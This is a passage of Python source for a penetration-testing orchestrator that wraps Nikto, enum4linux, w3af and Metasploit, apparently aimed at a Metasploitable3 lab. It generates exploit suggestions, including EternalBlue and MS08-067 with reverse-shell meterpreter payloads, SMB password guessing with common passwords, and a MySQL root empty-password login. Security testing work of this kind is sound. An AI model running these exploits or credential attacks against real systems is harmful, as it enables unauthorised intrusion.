                vulnerability = {
                    'id': item.get('id', ''),
                    'osvdbid': item.get('osvdbid', ''),
                    'method': item.get('method', ''),
                    'uri': item.get('uri', ''),
                    'description': item.text.strip() if item.text else '',
                    'namelink': item.get('namelink', ''),
                    'iplink': item.get('iplink', '')
                }

                vulnerability['severity'] = self._determine_severity(vulnerability['description'])

                scan_result['vulnerabilities'].append(vulnerability)

            statistics = root.find('.//statistics')
            if statistics is not None:
                scan_result['statistics'] = {
                    'elapsed': statistics.get('elapsed', ''),
                    'itemsfound': statistics.get('itemsfound', '0'),
                    'itemstested': statistics.get('itemstested', '0')
                }

            logger.log_xml_parsing(str(xml_file), True,
                                   f"Found {len(scan_result['vulnerabilities'])} vulnerabilities")

            return scan_result

        except Exception as e:
            logger.log_xml_parsing(str(xml_file), False, str(e))
            return None

    def _clean_nikto_xml(self, xml_content: str) -> str:
        """Clean up malformed XML content from Nikto."""
        try:
            xml_content = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', xml_content)
            xml_content = re.sub(r'&(?!(?:amp|lt|gt|quot|apos);)', '&amp;', xml_content)

            if not xml_content.strip().endswith('</niktoscan>'):
                xml_content += '</niktoscan>'

            return xml_content

        except Exception as e:
            logger.debug(f"Error cleaning XML content: {e}")
            return xml_content

    def _determine_severity(self, description: str) -> str:
        """Determine vulnerability severity based on description keywords."""
        if not description:
            return 'info'

        desc_lower = description.lower()

        high_keywords = [
            'remote code execution', 'rce', 'sql injection', 'command injection',
            'buffer overflow', 'privilege escalation', 'arbitrary file', 'directory traversal'
        ]

        medium_keywords = [
            'cross-site scripting', 'xss', 'csrf', 'authentication bypass',
            'information disclosure', 'weak authentication', 'default credentials'
        ]

        low_keywords = [
            'information leak', 'banner', 'version disclosure', 'robots.txt',
            'debug', 'test file', 'backup file'
        ]

        if any(keyword in desc_lower for keyword in high_keywords):
            return 'high'
        elif any(keyword in desc_lower for keyword in medium_keywords):
            return 'medium'
        elif any(keyword in desc_lower for keyword in low_keywords):
            return 'low'
        else:
            return 'info'

    def _create_summary_file(self) -> None:
        """Create a summary file of all Nikto scan results."""
        try:
            summary_file = self.results_dir / "nikto_summary.txt"

            with open(summary_file, 'w', encoding='utf-8') as f:
                f.write("NIKTO SCAN SUMMARY\n")
                f.write("=" * 50 + "\n\n")

                if not self.scan_results:
                    f.write("No Nikto scan results available.\n")
                    return

                total_vulns = sum(len(result['vulnerabilities']) for result in self.scan_results)
                f.write(f"Total services scanned: {len(self.scan_results)}\n")
                f.write(f"Total vulnerabilities found: {total_vulns}\n\n")

                for result in self.scan_results:
                    f.write(f"Service: {result['url']}\n")
                    f.write(f"IP: {result['ip']}:{result['port']}\n")
                    f.write(f"Vulnerabilities found: {len(result['vulnerabilities'])}\n")

                    if result['vulnerabilities']:
                        severity_counts = {'high': 0, 'medium': 0, 'low': 0, 'info': 0}
                        for vuln in result['vulnerabilities']:
                            severity = vuln.get('severity', 'info')
                            severity_counts[severity] += 1

                        f.write(f"  - High: {severity_counts['high']}\n")
                        f.write(f"  - Medium: {severity_counts['medium']}\n")
                        f.write(f"  - Low: {severity_counts['low']}\n")
                        f.write(f"  - Info: {severity_counts['info']}\n")

                    f.write("\n" + "-" * 40 + "\n\n")

                all_vulns = []
                for result in self.scan_results:
                    for vuln in result['vulnerabilities']:
                        vuln['service_url'] = result['url']
                        all_vulns.append(vuln)

                severity_order = {'high': 3, 'medium': 2, 'low': 1, 'info': 0}
                all_vulns.sort(key=lambda v: severity_order.get(v.get('severity', 'info'), 0), reverse=True)

                f.write("TOP VULNERABILITIES (by severity):\n")
                f.write("-" * 40 + "\n")

                for i, vuln in enumerate(all_vulns[:20]):
                    f.write(f"{i+1}. [{vuln.get('severity', 'info').upper()}] {vuln['service_url']}\n")
                    f.write(f"   URI: {vuln.get('uri', 'N/A')}\n")
                    f.write(f"   Description: {vuln.get('description', 'N/A')[:100]}...\n")
                    f.write("\n")

            logger.debug(f"Nikto summary saved to {summary_file}")

        except Exception as e:
            logger.error(f"Error creating Nikto summary file: {e}")

    def get_scan_summary(self) -> Dict[str, Any]:
        """Get a summary of scan results for reporting."""
        if not self.scan_results:
            return {
                'services_scanned': 0,
                'total_vulnerabilities': 0,
                'severity_breakdown': {'high': 0, 'medium': 0, 'low': 0, 'info': 0},
                'top_vulnerabilities': []
            }

        total_vulns = sum(len(result['vulnerabilities']) for result in self.scan_results)
        severity_counts = {'high': 0, 'medium': 0, 'low': 0, 'info': 0}

        all_vulns = []
        for result in self.scan_results:
            for vuln in result['vulnerabilities']:
                severity = vuln.get('severity', 'info')
                severity_counts[severity] += 1
                all_vulns.append({
                    'url': result['url'],
                    'description': vuln.get('description', '')[:80] + '...',
                    'severity': severity,
                    'uri': vuln.get('uri', '')
                })

        severity_order = {'high': 3, 'medium': 2, 'low': 1, 'info': 0}
        all_vulns.sort(key=lambda v: severity_order.get(v['severity'], 0), reverse=True)

        return {
            'services_scanned': len(self.scan_results),
            'total_vulnerabilities': total_vulns,
            'severity_breakdown': severity_counts,
            'top_vulnerabilities': all_vulns[:10]
        }

class MetasploitWrapper:
    """Metasploit Framework integration wrapper."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.output_file = self.results_dir / "metasploit_suggestions.txt"
        self.timeout = config.get('tools.msfconsole.timeout', 300)

    def check_availability(self) -> bool:
        """Check if msfconsole is available on the system."""
        try:
            executable = config.get('tools.msfconsole.executable')
            result = subprocess.run([executable, '--version'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            available = 'Framework' in result.stdout or 'Metasploit' in result.stdout
            logger.log_tool_availability('msfconsole', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('msfconsole', False)
            logger.debug(f"msfconsole availability check failed: {e}")
            return False

    def generate_exploit_suggestions(self, nmap_results: Dict[str, Any],
                                   searchsploit_results: Dict[str, Any],
                                   enum4linux_results: Dict[str, Any]) -> Tuple[bool, str]:
        """Generate Metasploit exploit suggestions based on scan results."""
        try:
            logger.start_tool_step('metasploit', 'Generating exploit suggestions')

            suggestions = []
            target_ip = None

            # Extract target IP from nmap results
            if nmap_results and 'hosts' in nmap_results:
                for host in nmap_results['hosts']:
                    for addr in host.get('addresses', []):
                        if addr.get('addrtype') == 'ipv4':
                            target_ip = addr['addr']
                            break
                    if target_ip:
                        break

            if not target_ip:
                return False, "No target IP found for Metasploit suggestions"

            # Analyze services for known vulnerabilities
            if nmap_results and 'hosts' in nmap_results:
                for host in nmap_results['hosts']:
                    for port in host.get('ports', []):
                        if port.get('state', {}).get('state') == 'open':
                            port_num = int(port.get('portid', 0))
                            service_name = port.get('service', {}).get('name', '').lower()
                            product = port.get('service', {}).get('product', '').lower()
                            version = port.get('service', {}).get('version', '')

                            # SMB vulnerabilities (Metasploitable3)
                            if port_num == 445 and 'smb' in service_name:
                                suggestions.extend(self._get_smb_exploits(target_ip, product, version))

                            # MySQL vulnerabilities
                            if port_num == 3306 and 'mysql' in service_name:
                                suggestions.extend(self._get_mysql_exploits(target_ip, version))

                            # HTTP/HTTPS services
                            if port_num in [80, 443, 8080, 8443] and 'http' in service_name:
                                suggestions.extend(self._get_web_exploits(target_ip, port_num, product))

                            # RDP vulnerabilities
                            if port_num == 3389 and 'rdp' in service_name:
                                suggestions.extend(self._get_rdp_exploits(target_ip, version))

            # Add enum4linux-based suggestions
            if enum4linux_results:
                suggestions.extend(self._get_enum4linux_suggestions(target_ip, enum4linux_results))

            # Write suggestions to file
            self._write_suggestions_file(suggestions, target_ip)

            logger.end_tool_step('metasploit', True, f"Generated {len(suggestions)} exploit suggestions")
            return True, f"Generated {len(suggestions)} Metasploit exploit suggestions"

        except Exception as e:
            error_msg = f"Metasploit suggestion generation error: {str(e)}"
            logger.end_tool_step('metasploit', False, error_msg)
            return False, error_msg

    def _get_smb_exploits(self, target_ip: str, product: str, version: str) -> List[Dict[str, Any]]:
        """Get SMB-related exploit suggestions."""
        suggestions = []

        # EternalBlue (MS17-010) - common on Metasploitable3
        if 'windows' in product.lower() or not product:
            suggestions.append({
                'module': 'exploit/windows/smb/ms17_010_eternalblue',
                'name': 'EternalBlue SMB Remote Code Execution',
                'description': 'MS17-010 EternalBlue SMBv1 exploit',
                'options': {
                    'RHOSTS': target_ip,
                    'LHOST': 'YOUR_IP_HERE',
                    'LPORT': '4444'
                },
                'payload': 'windows/x64/meterpreter/reverse_tcp',
                'priority': 'high'
            })

        # Other SMB exploits
        suggestions.extend([
            {
                'module': 'auxiliary/scanner/smb/smb_ms17_010',
                'name': 'SMB MS17-010 Scanner',
                'description': 'Check if target is vulnerable to MS17-010',
                'options': {'RHOSTS': target_ip},
                'priority': 'medium'
            },
            {
                'module': 'exploit/windows/smb/ms08_067_netapi',
                'name': 'MS08-067 NetAPI',
                'description': 'MS08-067 SMB NetAPI exploit',
                'options': {
                    'RHOSTS': target_ip,
                    'LHOST': 'YOUR_IP_HERE'
                },
                'payload': 'windows/meterpreter/reverse_tcp',
                'priority': 'high'
            }
        ])

        return suggestions

    def _get_mysql_exploits(self, target_ip: str, version: str) -> List[Dict[str, Any]]:
        """Get MySQL-related exploit suggestions."""
        suggestions = []

        suggestions.append({
            'module': 'auxiliary/scanner/mysql/mysql_login',
            'name': 'MySQL Login Scanner',
            'description': 'Attempt to login to MySQL with default credentials',
            'options': {
                'RHOSTS': target_ip,
                'USERNAME': 'root',
                'PASSWORD': ''
            },
            'priority': 'high'
        })

        return suggestions

    def _get_web_exploits(self, target_ip: str, port: int, product: str) -> List[Dict[str, Any]]:
        """Get web service exploit suggestions."""
        suggestions = []

        protocol = 'https' if port in [443, 8443] else 'http'
        target_url = f"{protocol}://{target_ip}:{port}"

        # Common web exploits for Metasploitable3
        suggestions.extend([
            {
                'module': 'auxiliary/scanner/http/http_login',
                'name': 'HTTP Login Scanner',
                'description': 'Test for common web login interfaces',
                'options': {
                    'RHOSTS': target_ip,
                    'RPORT': str(port),
                    'TARGETURI': '/'
                },
                'priority': 'medium'
            },
            {
                'module': 'auxiliary/scanner/http/dir_scanner',
                'name': 'Directory Scanner',
                'description': 'Scan for common web directories',
                'options': {
                    'RHOSTS': target_ip,
                    'RPORT': str(port)
                },
                'priority': 'low'
            }
        ])

        return suggestions

    def _get_rdp_exploits(self, target_ip: str, version: str) -> List[Dict[str, Any]]:
        """Get RDP-related exploit suggestions."""
        suggestions = []

        suggestions.append({
            'module': 'auxiliary/scanner/rdp/rdp_scanner',
            'name': 'RDP Scanner',
            'description': 'Check RDP service configuration',
            'options': {'RHOSTS': target_ip},
            'priority': 'low'
        })

        return suggestions

    def _get_enum4linux_suggestions(self, target_ip: str, enum4linux_results: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate suggestions based on enum4linux results."""
        suggestions = []

        # Check for interesting users
        interesting_users = ['administrator', 'admin', 'guest', 'service', 'sql']
        found_users = [user.get('username', '').lower() for user in enum4linux_results.get('users', [])]

        for user in found_users:
            if any(int_user in user for int_user in interesting_users):
                suggestions.append({
                    'module': 'auxiliary/scanner/smb/smb_login',
                    'name': f'SMB Login Check for {user}',
                    'description': f'Attempt SMB login with common passwords for user {user}',
                    'options': {
                        'RHOSTS': target_ip,
                        'SMBUser': user,
                        'SMBPass': 'password,vagrant,admin,123456'
                    },
                    'priority': 'high'
                })
                break  # Only add one login check

        return suggestions

    def _write_suggestions_file(self, suggestions: List[Dict[str, Any]], target_ip: str) -> None:
        """Write exploit suggestions to file."""
        try:
            self.results_dir.mkdir(parents=True, exist_ok=True)

            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write("METASPLOIT EXPLOIT SUGGESTIONS\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target IP: {target_ip}\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

                if not suggestions:
                    f.write("No specific exploit suggestions generated.\n")
                    f.write("Try manual enumeration or use generic Metasploit modules.\n")
                    return

                # Group by priority
                high_priority = [s for s in suggestions if s.get('priority') == 'high']
                medium_priority = [s for s in suggestions if s.get('priority') == 'medium']
                low_priority = [s for s in suggestions if s.get('priority') == 'low']

                for priority, exploits in [("HIGH", high_priority), ("MEDIUM", medium_priority), ("LOW", low_priority)]:
                    if exploits:
                        f.write(f"{priority} PRIORITY EXPLOITS:\n")
                        f.write("-" * 30 + "\n")

                        for i, exploit in enumerate(exploits, 1):
                            f.write(f"{i}. {exploit['name']}\n")
                            f.write(f"   Module: {exploit['module']}\n")
                            f.write(f"   Description: {exploit['description']}\n")

                            if 'options' in exploit:
                                f.write("   Options:\n")
                                for key, value in exploit['options'].items():
                                    f.write(f"     {key} = {value}\n")

                            if 'payload' in exploit:
                                f.write(f"   Payload: {exploit['payload']}\n")

                            f.write("\n")

                        f.write("\n")

                # Add usage instructions
                f.write("USAGE INSTRUCTIONS:\n")
                f.write("-" * 20 + "\n")
                f.write("1. Start Metasploit: msfconsole\n")
                f.write("2. Use a module: use <module_path>\n")
                f.write("3. Set options: set <OPTION> <VALUE>\n")
                f.write("4. Set payload (if applicable): set PAYLOAD <payload>\n")
                f.write("5. Run exploit: exploit\n\n")

                f.write("EXAMPLE:\n")
                f.write("msf6 > use exploit/windows/smb/ms17_010_eternalblue\n")
                f.write("msf6 > set RHOSTS 192.168.1.100\n")
                f.write("msf6 > set LHOST YOUR_IP_HERE\n")
                f.write("msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
                f.write("msf6 > exploit\n")

        except Exception as e:
            logger.error(f"Error writing Metasploit suggestions: {e}")

# =============================================================================
# CORE ORCHESTRATION
# =============================================================================

class Enum4LinuxWrapper:
    """enum4linux wrapper for SMB enumeration."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.output_file = self.results_dir / "enum4linux.txt"
        self.timeout = config.get('tools.enum4linux.timeout', 300)
        self.raw_output = ""

    def check_availability(self) -> bool:
        """Check if enum4linux is available on the system."""
        try:
            executable = config.get('tools.enum4linux.executable')
            result = subprocess.run([executable, '-h'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            available = 'enum4linux' in result.stderr.lower() or 'usage' in result.stderr.lower()
            logger.log_tool_availability('enum4linux', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('enum4linux', False)
            logger.debug(f"enum4linux availability check failed: {e}")
            return False

    def run_enumeration(self, target_ip: str) -> Tuple[bool, str]:
        """Run enum4linux enumeration against target."""
        try:
            logger.start_tool_step('enum4linux', f'Enumerating SMB services on {target_ip}')

            executable = config.get('tools.enum4linux.executable')
            command = [executable, '-a', target_ip]

            self.results_dir.mkdir(parents=True, exist_ok=True)

            logger.log_command_execution(command, str(self.results_dir))

            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=str(self.results_dir)
            )

            stdout, stderr = process.communicate(timeout=self.timeout)

            self.raw_output = stdout

            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write("ENUM4LINUX ENUMERATION RESULTS\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target: {target_ip}\n")
                f.write(f"Command: {' '.join(command)}\n\n")
                f.write("STDOUT OUTPUT:\n")
                f.write(stdout)
                if stderr.strip():
                    f.write("\n\nSTDERR OUTPUT:\n")
                    f.write(stderr)

            if stdout.strip():
                logger.log_tool_output('enum4linux', stdout, False)
            if stderr.strip():
                logger.log_tool_output('enum4linux', stderr, True)

            success = len(stdout.strip()) > 100

            if success:
                logger.end_tool_step('enum4linux', True, f"Results saved to {self.output_file}")
                return True, f"enum4linux enumeration completed. Results: {self.output_file}"
            else:
                error_msg = f"enum4linux produced minimal output (exit code: {process.returncode})"
                if stderr:
                    error_msg += f"\nError: {stderr}"
                logger.end_tool_step('enum4linux', False, error_msg)
                return False, error_msg

        except subprocess.TimeoutExpired:
            error_msg = f"enum4linux timed out after {self.timeout} seconds"
            logger.end_tool_step('enum4linux', False, error_msg)
            return False, error_msg
        except Exception as e:
            error_msg = f"enum4linux execution error: {str(e)}"
            logger.end_tool_step('enum4linux', False, error_msg)
            return False, error_msg

    def parse_results(self, output: Optional[str] = None) -> Dict[str, Any]:
        """Parse enum4linux output and extract key information."""
        if output is None:
            output = self.raw_output
            if not output and self.output_file.exists():
                try:
                    with open(self.output_file, 'r', encoding='utf-8') as f:
                        content = f.read()
                        if "STDOUT OUTPUT:" in content:
                            output = content.split("STDOUT OUTPUT:")[1]
                            if "STDERR OUTPUT:" in output:
                                output = output.split("STDERR OUTPUT:")[0]
                except Exception as e:
                    logger.error(f"Error reading enum4linux output: {e}")
                    return {'users': [], 'groups': [], 'shares': [], 'os_info': {}, 'summary': {}}

        results = {
            'users': [],
            'groups': [],
            'shares': [],
            'os_info': {},
            'domain_info': {},
            'password_policy': {},
            'summary': {}
        }

        if not output:
            return results

        try:
            lines = output.split('\n')

            self._parse_os_information(lines, results)
            self._parse_domain_information(lines, results)
            self._parse_users(lines, results)
            self._parse_groups(lines, results)
            self._parse_shares(lines, results)
            self._parse_password_policy(lines, results)

            results['summary'] = {
                'users_found': len(results['users']),
                'groups_found': len(results['groups']),
                'shares_found': len(results['shares']),
                'has_os_info': bool(results['os_info']),
                'has_domain_info': bool(results['domain_info'])
            }

            logger.debug(f"Parsed enum4linux results: {results['summary']}")
            return results

        except Exception as e:
            logger.error(f"Error parsing enum4linux results: {e}")
            return results

    def _parse_os_information(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse OS information from enum4linux output."""
        try:
            in_os_section = False

            for line in lines:
                line = line.strip()

                if 'OS information on' in line or 'Target Information' in line:
                    in_os_section = True
                    continue
                elif line.startswith('=====') and in_os_section:
                    in_os_section = False
                    continue

                if in_os_section or 'OS:' in line:
                    if re.search(r'OS:\s*(.+)', line):
                        match = re.search(r'OS:\s*(.+)', line)
                        results['os_info']['name'] = match.group(1).strip()
                    elif 'Computer:' in line:
                        results['os_info']['computer'] = line.split('Computer:')[1].strip()
                    elif 'NetBIOS computer name:' in line:
                        results['os_info']['netbios_name'] = line.split('NetBIOS computer name:')[1].strip()
                    elif 'Workgroup\\Domain name:' in line:
                        results['os_info']['domain'] = line.split('Workgroup\\Domain name:')[1].strip()

        except Exception as e:
            logger.debug(f"Error parsing OS information: {e}")

    def _parse_domain_information(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse domain information from enum4linux output."""
        try:
            for line in lines:
                line = line.strip()

                if 'Domain Name:' in line:
                    results['domain_info']['name'] = line.split('Domain Name:')[1].strip()
                elif 'Domain Sid:' in line:
                    results['domain_info']['sid'] = line.split('Domain Sid:')[1].strip()
                elif 'Local SID for the domain:' in line:
                    results['domain_info']['local_sid'] = line.split('Local SID for the domain:')[1].strip()

        except Exception as e:
            logger.debug(f"Error parsing domain information: {e}")

    def _parse_users(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse user information from enum4linux output."""
        try:
            in_user_section = False

            for line in lines:
                line = line.strip()

                if ('Getting the list of users:' in line or
                    'Users on' in line or
                    'user:[' in line):
                    in_user_section = True

                if in_user_section:
                    user_patterns = [
                        r'user:\[([^\]]+)\].*rid:\[([^\]]+)\]',
                        r'S-[\d\-]+\s+([^\s]+)\s+\(.*User.*\)',
                        r'(\w+)\s+.*\(User\)',
                    ]

                    for pattern in user_patterns:
                        match = re.search(pattern, line, re.IGNORECASE)
                        if match:
                            username = match.group(1)
                            user_info = {'username': username}

                            if len(match.groups()) > 1:
                                user_info['rid'] = match.group(2)

                            if not any(u['username'] == username for u in results['users']):
                                results['users'].append(user_info)
                            break

        except Exception as e:
            logger.debug(f"Error parsing users: {e}")

    def _parse_groups(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse group information from enum4linux output."""
        try:
            for line in lines:
                line = line.strip()

                group_patterns = [
                    r'group:\[([^\]]+)\].*rid:\[([^\]]+)\]',
                    r'(\w+)\s+.*\(Group\)',
                ]

                for pattern in group_patterns:
                    match = re.search(pattern, line, re.IGNORECASE)
                    if match:
                        groupname = match.group(1)
                        group_info = {'groupname': groupname}

                        if len(match.groups()) > 1:
                            group_info['rid'] = match.group(2)

                        if not any(g['groupname'] == groupname for g in results['groups']):
                            results['groups'].append(group_info)
                        break

        except Exception as e:
            logger.debug(f"Error parsing groups: {e}")

    def _parse_shares(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse share information from enum4linux output."""
        try:
            in_share_section = False

            for line in lines:
                line = line.strip()

                if ('Share Enumeration on' in line or
                    'Sharename' in line and 'Type' in line):
                    in_share_section = True
                    continue

                if in_share_section:
                    share_match = re.match(r'(\w+)\s+(Disk|IPC|Printer)\s*(.*)', line)
                    if share_match:
                        share_info = {
                            'name': share_match.group(1),
                            'type': share_match.group(2),
                            'comment': share_match.group(3).strip() if share_match.group(3) else ''
                        }
                        results['shares'].append(share_info)

                    elif line.startswith('=====') or 'Attempting to map shares' in line:
                        in_share_section = False

        except Exception as e:
            logger.debug(f"Error parsing shares: {e}")

    def _parse_password_policy(self, lines: List[str], results: Dict[str, Any]) -> None:
        """Parse password policy information from enum4linux output."""
        try:
            for line in lines:
                line = line.strip()

                if 'Password Complexity Flags:' in line:
                    results['password_policy']['complexity'] = line.split(':')[1].strip()
                elif 'Minimum password length:' in line:
                    results['password_policy']['min_length'] = line.split(':')[1].strip()
                elif 'Password history length:' in line:
                    results['password_policy']['history_length'] = line.split(':')[1].strip()
                elif 'Maximum password age:' in line:
                    results['password_policy']['max_age'] = line.split(':')[1].strip()

        except Exception as e:
            logger.debug(f"Error parsing password policy: {e}")

    def get_enumeration_summary(self) -> Dict[str, Any]:
        """Get a summary of enumeration results for reporting."""
        results = self.parse_results()

        summary = {
            'users_found': len(results['users']),
            'groups_found': len(results['groups']),
            'shares_found': len(results['shares']),
            'interesting_users': [],
            'interesting_shares': [],
            'os_details': results.get('os_info', {}),
            'domain_details': results.get('domain_info', {})
        }

        admin_keywords = ['admin', 'administrator', 'root', 'service', 'sql']
        for user in results['users']:
            username = user['username'].lower()
            if any(keyword in username for keyword in admin_keywords):
                summary['interesting_users'].append(user['username'])

        standard_shares = ['ipc$', 'c$', 'admin$', 'print$']
        for share in results['shares']:
            share_name = share['name'].lower()
            if share_name not in standard_shares and share['type'] == 'Disk':
                summary['interesting_shares'].append(share['name'])

        return summary

class W3afWrapper:
    """w3af wrapper for web application scanning."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.script_file = self.results_dir / "w3af_script.w3af"
        self.output_file = self.results_dir / "w3af_report.txt"
        self.timeout = config.get('tools.w3af_console.timeout', 600)
        self.script_timeout = config.get('tools.w3af_console.script_timeout', 300)

    def check_availability(self) -> bool:
        """Check if w3af_console is available on the system."""
        try:
            executable = config.get('tools.w3af_console.executable')
            result = subprocess.run([executable, '--help'],
                                    capture_output=True,
                                    timeout=10,
                                    text=True)
            available = result.returncode == 0
            logger.log_tool_availability('w3af_console', available, executable if available else None)
            return available
        except Exception as e:
            logger.log_tool_availability('w3af_console', False)
            logger.debug(f"w3af availability check failed: {e}")
            return False

    def run_scan(self, http_ports: List[Dict[str, Any]]) -> Tuple[bool, str]:
        """Run w3af scan against discovered HTTP services."""
        if not http_ports:
            logger.info("No HTTP/HTTPS ports found for w3af scanning")
            return True, "No HTTP/HTTPS services to scan"

        logger.start_tool_step('w3af', f'Scanning {len(http_ports)} HTTP/HTTPS services')

        self.results_dir.mkdir(parents=True, exist_ok=True)

        # Create w3af script
        script_content = self._create_w3af_script(http_ports)

        with open(self.script_file, 'w', encoding='utf-8') as f:
            f.write(script_content)

        # Run w3af
        executable = config.get('tools.w3af_console.executable')
        command = [executable, '-s', str(self.script_file)]

        logger.log_command_execution(command, str(self.results_dir))

        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=str(self.results_dir)
            )

            stdout, stderr = process.communicate(timeout=self.timeout)

            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write("W3AF SCAN RESULTS\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Script: {self.script_file}\n")
                f.write(f"Command: {' '.join(command)}\n\n")
                f.write("STDOUT OUTPUT:\n")
                f.write(stdout)
                if stderr.strip():
                    f.write("\n\nSTDERR OUTPUT:\n")
                    f.write(stderr)

            if stdout.strip():
                logger.log_tool_output('w3af', stdout, False)
            if stderr.strip():
                logger.log_tool_output('w3af', stderr, True)

            success = process.returncode == 0 and len(stdout.strip()) > 100

            if success:
                logger.end_tool_step('w3af', True, f"Results saved to {self.output_file}")
                return True, f"w3af scan completed. Results: {self.output_file}"
            else:
                logger.end_tool_step('w3af', False, "w3af scan produced minimal output")
                return False, "w3af scan completed with minimal output"

        except subprocess.TimeoutExpired:
            error_msg = f"w3af timed out after {self.timeout} seconds"
            logger.end_tool_step('w3af', False, error_msg)
            return False, error_msg
        except Exception as e:
            error_msg = f"w3af execution error: {str(e)}"
            logger.end_tool_step('w3af', False, error_msg)
            return False, error_msg

    def _create_w3af_script(self, http_ports: List[Dict[str, Any]]) -> str:
        """Create w3af script for scanning HTTP services."""
        script_lines = [
            "# w3af scan script generated by Security Orchestrator",
            "plugins",
            "discovery web_spider",
            "audit sqli, xss",
            "output console, text_file",
            "output config text_file",
            "set output_file " + str(self.results_dir / "w3af_detailed_report.txt"),
            "",
            "# Target URLs"
        ]

        for http_service in http_ports:
            script_lines.append(f"http-fuzz target {http_service['url']}")

        script_lines.extend([
            "",
            "# Start scan with timeout",
            f"set max_execution_time {self.script_timeout}",
            "start",
            "exit"
        ])

        return "\n".join(script_lines)

    def parse_results(self) -> Dict[str, Any]:
        """Parse w3af output and extract findings."""
        results = {
            'vulnerabilities': [],
            'scan_summary': {},
            'urls_scanned': []
        }

        if not self.output_file.exists():
            return results

        try:
            with open(self.output_file, 'r', encoding='utf-8') as f:
                content = f.read()

            # Extract vulnerabilities
            vuln_pattern = r'Found\s+(\d+)\s+vulnerabilities?'
            match = re.search(vuln_pattern, content, re.IGNORECASE)
            if match:
                results['scan_summary']['total_vulnerabilities'] = int(match.group(1))

            # Extract specific vulnerability details
            vuln_lines = []
            in_vuln_section = False

            for line in content.split('\n'):
                line = line.strip()
                if 'Vulnerability' in line or 'SQL injection' in line or 'Cross site scripting' in line:
                    in_vuln_section = True
                    vuln_lines.append(line)
                elif in_vuln_section and line:
                    vuln_lines.append(line)
                elif in_vuln_section and not line:
                    in_vuln_section = False

            # Parse individual vulnerabilities
            for vuln_text in vuln_lines:
                if 'SQL injection' in vuln_text:
                    results['vulnerabilities'].append({
                        'type': 'SQL Injection',
                        'severity': 'high',
                        'description': vuln_text[:200]
                    })
                elif 'Cross site scripting' in vuln_text:
                    results['vulnerabilities'].append({
                        'type': 'Cross-Site Scripting',
                        'severity': 'medium',
                        'description': vuln_text[:200]
                    })

            logger.debug(f"Parsed {len(results['vulnerabilities'])} w3af vulnerabilities")
            return results

        except Exception as e:
            logger.error(f"Error parsing w3af results: {e}")
            return results

# =============================================================================
# CORE ORCHESTRATION
# =============================================================================

class Orchestrator:
    """Main orchestrator for security tool execution."""

    def __init__(self, results_dir: Optional[Path] = None):
        self.results_dir = results_dir or config.get_results_dir()
        self.scan_results = ScanResults()
        self.attack_path = AttackPath()

        # Initialize tool wrappers
        self.nmap_wrapper = NmapWrapper(self.results_dir)
        self.searchsploit_wrapper = SearchsploitWrapper(self.results_dir)
        self.nikto_wrapper = NiktoWrapper(self.results_dir)
        self.enum4linux_wrapper = Enum4LinuxWrapper(self.results_dir)
        self.w3af_wrapper = W3afWrapper(self.results_dir)
        self.metasploit_wrapper = MetasploitWrapper(self.results_dir)

    def run_comprehensive_scan(self, nmap_command: str, target_ip: Optional[str] = None,
                             progress_callback: Optional[Callable] = None) -> Tuple[bool, str]:
        """Run the complete security scanning workflow."""
        try:
            logger.start_scan_session(target_ip or "Unknown", nmap_command)

            self.scan_results.set_metadata('scan_start_time', datetime.now())
            self.scan_results.set_metadata('nmap_command', nmap_command)
            self.scan_results.set_metadata('target_ip', target_ip)

            steps = [
                ('nmap', 'Nmap Port Scanning', self._run_nmap_step),
                ('searchsploit', 'Exploit Database Search', self._run_searchsploit_step),
                ('nikto', 'Web Vulnerability Scanning', self._run_nikto_step),
                ('enum4linux', 'SMB Enumeration', self._run_enum4linux_step),
                ('w3af', 'Web Application Scanning', self._run_w3af_step),
                ('metasploit', 'Metasploit Exploit Suggestions', self._run_metasploit_step)
            ]

            successful_steps = 0

            for step_name, description, step_func in steps:
                if progress_callback:
                    progress_callback(f"Starting {description}...")

                try:
                    success, message = step_func(nmap_command, target_ip)
                    if success:
                        successful_steps += 1
                        self.scan_results.metadata['tools_used'].append(step_name)
                        if progress_callback:
                            progress_callback(f"✓ {description} completed")
                    else:
                        if progress_callback:
                            progress_callback(f"⚠ {description} failed: {message}")

                except Exception as e:
                    logger.error(f"Error in {step_name} step: {e}")
                    if progress_callback:
                        progress_callback(f"✗ {description} error: {str(e)}")

            self.scan_results.set_metadata('scan_end_time', datetime.now())

            # Generate final report
            report_path = self.results_dir / "final_report.txt"
            report_content = self._generate_final_report()

            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(report_content)

            logger.end_scan_session()

            success = successful_steps > 0
            message = f"Comprehensive scan completed. {successful_steps}/{len(steps)} tools successful. Report: {report_path}"

            return success, message

        except Exception as e:
            logger.exception(f"Comprehensive scan failed: {e}")
            return False, f"Scan failed: {str(e)}"

    def _run_nmap_step(self, nmap_command: str, target_ip: Optional[str] = None) -> Tuple[bool, str]:
        """Execute Nmap scanning step."""
        if not self.nmap_wrapper.check_availability():
            return False, "Nmap not available"

